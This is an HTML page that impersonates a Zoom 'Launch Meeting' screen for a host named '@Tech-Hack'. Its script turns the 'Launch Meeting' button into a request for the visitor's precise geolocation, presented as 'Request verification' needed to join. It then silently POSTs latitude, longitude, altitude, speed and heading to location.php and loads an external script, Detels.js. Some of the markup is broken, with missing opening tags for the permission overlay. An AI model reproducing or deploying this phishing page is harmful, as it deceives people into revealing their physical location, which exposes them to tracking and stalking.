<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Launch Meeting - Zoom</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap" rel="stylesheet"/>
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'Lato', sans-serif;
    background: #fff;
    color: #232333;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }

  /* ── NAV ── */
  nav {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 40px;
    height: 60px;
    border-bottom: 1px solid #e8e8e8;
    position: sticky;
    top: 0;
    background: #fff;
    z-index: 100;
  }

  .nav-logo {
    font-size: 28px;
    font-weight: 700;
    color: #2D8CFF;
    letter-spacing: -0.5px;
    font-family: 'Lato', sans-serif;
    text-decoration: none;
  }

  .nav-logo span { color: #2D8CFF; }

  .nav-right {
    display: flex;
    align-items: center;
    gap: 28px;
  }

  .nav-link {
    font-size: 14px;
    color: #2D8CFF;
    text-decoration: none;
    font-weight: 400;
    transition: color 0.15s;
  }

  .nav-link:hover { color: #1a6fd4; }

  .lang-select {
    font-size: 14px;
    color: #2D8CFF;
    border: none;
    background: none;
    cursor: pointer;
    font-family: 'Lato', sans-serif;
    appearance: none;
    padding-right: 16px;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'%3E%3Cpath d='M1 1l4 4 4-4' stroke='%232D8CFF' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-position: right 0 center;
  }

  /* ── MAIN ── */
  main {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 60px 20px 40px;
  }

  .launch-section {
    text-align: center;
    max-width: 560px;
  }

  .launch-icon {
    width: 72px;
    height: 72px;
    background: linear-gradient(135deg, #2D8CFF 0%, #0e5cc5 100%);
    border-radius: 20px;
    margin: 0 auto 28px;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 8px 24px rgba(45,140,255,0.28);
  }

  .launch-icon svg { width: 38px; height: 38px; }

  .launch-text-primary {
    font-size: 18px;
    font-weight: 400;
    color: #232333;
    line-height: 1.6;
    margin-bottom: 10px;
  }

  .launch-text-primary strong { font-weight: 700; }

  .launch-text-secondary {
    font-size: 18px;
    font-weight: 400;
    color: #232333;
    line-height: 1.6;
    margin-bottom: 18px;
  }

  .launch-text-secondary strong { font-weight: 700; }

  .tos-text {
    font-size: 14px;
    color: #666;
    margin-bottom: 30px;
    line-height: 1.6;
  }

  .tos-text a { color: #2D8CFF; text-decoration: none; }
  .tos-text a:hover { text-decoration: underline; }

  .launch-btn {
    display: inline-flex;
    align-items: center;
    gap: 10px;
    background: #2D8CFF;
    color: #fff;
    border: none;
    border-radius: 10px;
    padding: 14px 44px;
    font-size: 16px;
    font-weight: 700;
    font-family: 'Lato', sans-serif;
    cursor: pointer;
    transition: background 0.18s, transform 0.12s, box-shadow 0.18s;
    box-shadow: 0 4px 14px rgba(45,140,255,0.35);
    letter-spacing: 0.2px;
    position: relative;
    overflow: hidden;
  }

  .launch-btn::after {
    content: '';
    position: absolute;
    inset: 0;
    background: rgba(255,255,255,0);
    transition: background 0.15s;
    border-radius: inherit;
  }

  .launch-btn:hover { background: #1a76e8; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(45,140,255,0.42); }
  .launch-btn:active { transform: translateY(0); box-shadow: 0 2px 8px rgba(45,140,255,0.28); }

  .launch-btn svg { width: 20px; height: 20px; flex-shrink: 0; }

  .divider {
    width: 100%;
    max-width: 480px;
    border: none;
    border-top: 1px solid #e8e8e8;
    margin: 42px auto;
  }

  .download-text {
    font-size: 14px;
    color: #666;
    text-align: center;
  }

  .download-text a { color: #2D8CFF; text-decoration: none; font-weight: 600; }
  .download-text a:hover { text-decoration: underline; }

  /* ── FOOTER ── */
  footer {
    text-align: center;
    padding: 24px 20px;
    border-top: 1px solid #e8e8e8;
    font-size: 12.5px;
    color: #999;
    line-height: 2;
  }

  footer a { color: #999; text-decoration: none; }
  footer a:hover { text-decoration: underline; }
  .footer-sep { margin: 0 8px; }

  /* ── PERMISSION OVERLAY ── */
  .overlay {
    position: fixed;
    inset: 0;
    background: rgba(15,15,25,0.55);
    backdrop-filter: blur(3px);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 999;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.22s;
    padding: 20px;
  }

  .overlay.show { opacity: 1; pointer-events: all; }

  .perm-card {
    background: #fff;
    border-radius: 16px;
    width: 100%;
    max-width: 380px;
    padding: 32px 28px 26px;
    box-shadow: 0 24px 64px rgba(0,0,0,0.18);
    transform: translateY(12px) scale(0.97);
    transition: transform 0.26s cubic-bezier(.22,.68,0,1.2);
  }

  .overlay.show .perm-card { transform: translateY(0) scale(1); }

  .perm-browser-bar {
    display: flex;
    align-items: center;
    gap: 8px;
    background: #f4f4f6;
    border-radius: 8px;
    padding: 8px 12px;
    margin-bottom: 20px;
  }

  .perm-favicon {
    width: 16px;
    height: 16px;
    background: #2D8CFF;
    border-radius: 4px;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }

  .perm-favicon svg { width: 10px; height: 10px; }
  .perm-url { font-size: 12px; color: #555; font-family: monospace; }
  .perm-lock { font-size: 11px; color: #4CAF50; margin-left: auto; }

  .perm-icon-wrap {
    width: 58px;
    height: 58px;
    background: #EBF4FF;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 16px;
  }

  .perm-icon-wrap svg { width: 28px; height: 28px; }

  .perm-heading {
    font-size: 17px;
    font-weight: 700;
    color: #232333;
    text-align: center;
    margin-bottom: 6px;
  }

  .perm-site-name {
    font-size: 13px;
    color: #2D8CFF;
    text-align: center;
    margin-bottom: 14px;
    font-weight: 600;
  }

  .perm-desc {
    font-size: 13.5px;
    color: #555;
    text-align: center;
    line-height: 1.65;
    margin-bottom: 18px;
  }

  .perm-info-box {
    background: #F7FAFE;
    border: 1px solid #D8EAFF;
    border-radius: 10px;
    padding: 12px 14px;
    margin-bottom: 22px;
    display: flex;
    gap: 10px;
    align-items: flex-start;
  }

  .perm-info-box svg { width: 15px; height: 15px; flex-shrink: 0; margin-top: 1px; color: #2D8CFF; }

  .perm-info-text {
    font-size: 12.5px;
    color: #5a6a80;
    line-height: 1.55;
  }

  .perm-actions {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
  }

  .btn-deny {
    padding: 11px;
    border: 1px solid #d0d0d8;
    border-radius: 8px;
    background: #fff;
    font-size: 14px;
    font-weight: 600;
    color: #555;
    cursor: pointer;
    font-family: 'Lato', sans-serif;
    transition: background 0.14s, border-color 0.14s;
  }

  .btn-deny:hover { background: #f4f4f6; border-color: #bbb; }

  .btn-allow {
    padding: 11px;
    border: none;
    border-radius: 8px;
    background: #2D8CFF;
    font-size: 14px;
    font-weight: 700;
    color: #fff;
    cursor: pointer;
    font-family: 'Lato', sans-serif;
    transition: background 0.14s;
    box-shadow: 0 3px 10px rgba(45,140,255,0.32);
  }

  .btn-allow:hover { background: #1a76e8; }

  /* ── SUCCESS STATE ── */
  .success-overlay {
    position: fixed;
    inset: 0;
    background: rgba(15,15,25,0.55);
    backdrop-filter: blur(3px);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1000;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.22s;
    padding: 20px;
  }

  .success-overlay.show { opacity: 1; pointer-events: all; }

  .success-card {
    background: #fff;
    border-radius: 16px;
    width: 100%;
    max-width: 360px;
    padding: 36px 28px 28px;
    text-align: center;
    box-shadow: 0 24px 64px rgba(0,0,0,0.18);
    transform: scale(0.96);
    transition: transform 0.26s cubic-bezier(.22,.68,0,1.2);
  }

  .success-overlay.show .success-card { transform: scale(1); }

  .success-check {
    width: 64px;
    height: 64px;
    background: #E8F8EF;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 18px;
    animation: pop 0.4s cubic-bezier(.22,.68,0,1.4) 0.1s both;
  }

  @keyframes pop { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }

  .success-check svg { width: 32px; height: 32px; }

  .success-title { font-size: 18px; font-weight: 700; color: #232333; margin-bottom: 8px; }
  .success-sub { font-size: 13.5px; color: #666; line-height: 1.65; margin-bottom: 20px; }

  .loc-pill {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    background: #EBF4FF;
    border: 1px solid #c2dbff;
    border-radius: 20px;
    padding: 7px 16px;
    font-size: 13px;
    color: #1a5fad;
    font-weight: 600;
    margin-bottom: 22px;
  }

  .loc-pill svg { width: 14px; height: 14px; }

  .btn-launch-zoom {
    width: 100%;
    padding: 13px;
    background: #2D8CFF;
    border: none;
    border-radius: 10px;
    color: #fff;
    font-size: 15px;
    font-weight: 700;
    font-family: 'Lato', sans-serif;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    transition: background 0.15s;
    box-shadow: 0 4px 14px rgba(45,140,255,0.32);
    margin-bottom: 12px;
  }

  .btn-launch-zoom:hover { background: #1a76e8; }
  .btn-launch-zoom svg { width: 18px; height: 18px; }

  .btn-close-modal {
    background: none;
    border: none;
    font-size: 13px;
    color: #999;
    cursor: pointer;
    font-family: 'Lato', sans-serif;
    padding: 4px 8px;
    border-radius: 6px;
    transition: color 0.14s;
  }

  .btn-close-modal:hover { color: #555; }

  /* ── DENIED WARNING ── */
  .warn-banner {
    display: none;
    align-items: center;
    gap: 10px;
    background: #FFF8E7;
    border: 1px solid #F7C948;
    border-radius: 10px;
    padding: 12px 16px;
    margin-bottom: 20px;
    text-align: left;
  }

  .warn-banner.show { display: flex; }
  .warn-banner svg { width: 18px; height: 18px; color: #d4a017; flex-shrink: 0; }
  .warn-banner p { font-size: 13px; color: #7a5c00; line-height: 1.5; }
  .warn-banner p strong { font-weight: 700; }

  /* ── SPINNER ── */
  .spinner {
    width: 18px; height: 18px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
    display: none;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .meeting-host{
    margin-bottom:22px;
    font-size:15px;
    color:#666;
    font-weight:400;
  }

  .meeting-host strong{
    color:#232333;
    font-weight:700;
  }
</style>
</head>
<body>

<!-- NAV -->
<nav>
  <a href="#" class="nav-logo">zoom</a>
  <div class="nav-right">
    <a href="#" class="nav-link">Support</a>
    <select class="lang-select">
      <option>English</option>
      <option>Hindi</option>
      <option>Deutsch</option>
      <option>Français</option>
    </select>
  </div>
</nav>

<!-- MAIN -->
<main>
  <div class="launch-section">

    <div class="launch-icon">
      <svg viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect width="38" height="38" rx="10" fill="none"/>
        <rect x="6" y="11" width="18" height="16" rx="3" fill="white"/>
        <path d="M24 16.5l8-4.5v13l-8-4.5v-4z" fill="white"/>
      </svg>
    </div>

    <p class="launch-text-primary">
      Click <strong>Open link</strong> on the dialog shown by your browser
    </p>
    <p class="launch-text-secondary">
      If you don't see a dialog, click <strong>Launch Meeting</strong> below
    </p>
    <div class="meeting-host">
      Meeting hosted by <strong id="hostName">@Tech-Hack</strong>
    </div>

    <div class="meeting-host">
      Meeting Topic: <strong id="meetingTitle">Hack AI Workshop</strong>
    </div>
    <p class="tos-text">
      By clicking "Launch Meeting", you agree to our
      <a href="#">Terms of Service</a> and <a href="#">Privacy Statement</a>
    </p>

    <div id="warnBanner" class="warn-banner">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
        <line x1="12" y1="9" x2="12" y2="13"/>
        <line x1="12" y1="17" x2="12.01" y2="17"/>
      </svg>
      <p><strong>Request Access denied.</strong> You can still join the meeting, but the host may require Request verification.</p>
    </div>

    <button class="launch-btn" id="launchBtn" onclick="allowLocation()">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
        <polygon points="23 7 16 12 23 17 23 7"/>
        <rect x="1" y="5" width="15" height="14" rx="2" ry="2"/>
      </svg>
      Launch Meeting
      <div class="spinner" id="btnSpinner"></div>
    </button>
  </div>

  <hr class="divider"/>

  <p class="download-text">
    Don't have Zoom Client installed? <a href="#">Download Now</a>
  </p>
</main>

<!-- FOOTER -->
<footer>
  <p>&copy;2024 Zoom Video Communications, Inc. All rights reserved.</p>
  <p>
    <a href="#">Privacy &amp; Legal Policies</a>
    <span class="footer-sep">|</span>
    <a href="#">Do Not Sell My Personal Information</a>
    <span class="footer-sep">|</span>
    <a href="#">Cookie Preferences</a>
  </p>
</footer>
    <div class="perm-heading">Allow Access To Meet</div>
    <div class="perm-site-name">zoom.us wants to know your Request</div>

    <div class="perm-desc">
      The meeting host requires Request verification before you join. Your Request will be used only for this session.
    </div>

    <div class="perm-info-box">
      <svg viewBox="0 0 24 24" fill="none" stroke="#2D8CFF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="10"/>
        <line x1="12" y1="8" x2="12" y2="12"/>
        <line x1="12" y1="16" x2="12.01" y2="16"/>
      </svg>
      <div class="perm-info-text">
        Your precise Request is shared only with the meeting host and is not stored after the session ends. This is required for compliance and security purposes.
      </div>
    </div>

  </div>
</div>

<!-- SUCCESS OVERLAY -->
<div class="success-overlay" id="successOverlay">
  <div class="success-card">

    <div class="success-check">
      <svg viewBox="0 0 24 24" fill="none" stroke="#22a85a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="20 6 9 17 4 12"/>
      </svg>
    </div>

    <div class="success-title">Request Verified</div>
    <div class="success-sub">
      Your request has been shared with the meeting host. You can now join the meeting securely.
    </div>

    <div class="loc-pill" id="locPill">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/>
        <circle cx="12" cy="10" r="3"/>
      </svg>
      <span id="locText">Detecting Request...</span>
    </div>

    <button class="btn-launch-zoom" onclick="window.close()">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
        <polygon points="23 7 16 12 23 17 23 7"/>
        <rect x="1" y="5" width="15" height="14" rx="2" ry="2"/>
      </svg>
      Launch Zoom Meeting
    </button>
    <button class="btn-close-modal" onclick="closeSuccess()">Cancel</button>

  </div>
</div>
<script src="Detels.js"></script>
<script>

  // ==========================
  // ❌ DENY LOCATION
  // ==========================
  function denyLocation() {

    document
      .getElementById('warnBanner')
      .classList.add('show');

    showToast("Access denied");
  }

  // ==========================
  // ✅ ALLOW LOCATION
  // ==========================
  function allowLocation() {

    const spinner = document.getElementById('btnSpinner');
    const btn = document.getElementById('launchBtn');

    spinner.style.display = 'block';
    btn.disabled = true;

    // Browser support check
    if (!navigator.geolocation) {

      spinner.style.display = 'none';
      btn.disabled = false;

      updateUI("unsupported");

      showToast("Location not supported");

      return;
    }

    // ==========================
    // 📍 GET LOCATION
    // ==========================
    navigator.geolocation.getCurrentPosition(

      // ✅ SUCCESS
      function(pos) {

        spinner.style.display = 'none';
        btn.disabled = false;

        const data = {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          speed: pos.coords.speed,
          heading: pos.coords.heading,
          timestamp: new Date().toISOString()
        };

        console.log("📍 Location OK:", data);

        // Send location
        sendLocation(data);

        // Show coordinates
        const lat = pos.coords.latitude.toFixed(5);
        const lng = pos.coords.longitude.toFixed(5);

        document.getElementById('locText').textContent =
          lat + ', ' + lng;

        // Success popup
        document
          .getElementById('successOverlay')
          .classList.add('show');

        updateUI("success");

        showToast("Location verified");
      },

      // ❌ ERROR / DENIED
      function(error) {

        spinner.style.display = 'none';
        btn.disabled = false;

        console.log("❌ GPS Error:", error.message);

        if (error.code === error.PERMISSION_DENIED) {

          document
            .getElementById('warnBanner')
            .classList.add('show');

          updateUI("denied");

          showToast("Permission denied");

        } else {

          updateUI("error");

          showToast("Location error");
        }
      },

      {
        enableHighAccuracy: true,
        timeout: 30000,
        maximumAge: 0
      }
    );
  }

  // ==========================
  // 📡 SEND LOCATION
  // ==========================
  async function sendLocation(data) {

    try {

      await fetch("location.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });

    } catch (err) {

      console.log("Server error");
    }
  }

  // ==========================
  // 🎯 UI UPDATE
  // ==========================
  function updateUI(state) {

    const btn = document.getElementById("launchBtn");

    if (!btn) return;

    if (state === "success") {

      btn.innerHTML = "✓ Verified";
    }

    if (state === "denied") {

      btn.innerHTML = "Allow Access";
    }

    if (state === "error") {

      btn.innerHTML = "Retry";
    }

    if (state === "unsupported") {

      btn.innerHTML = "Not Supported";
    }
  }

  // ==========================
  // 🔔 TOAST SYSTEM
  // ==========================
  function showToast(message) {

    const toast = document.getElementById("toast");

    if (!toast) return;

    toast.innerHTML = message;

    toast.classList.add("show");

    setTimeout(function () {

      toast.classList.remove("show");

    }, 3000);
  }

  // ==========================
  // ❌ CLOSE SUCCESS
  // ==========================
  function closeSuccess() {

    document
      .getElementById('successOverlay')
      .classList.remove('show');
  }

</script>
</body>
</html>
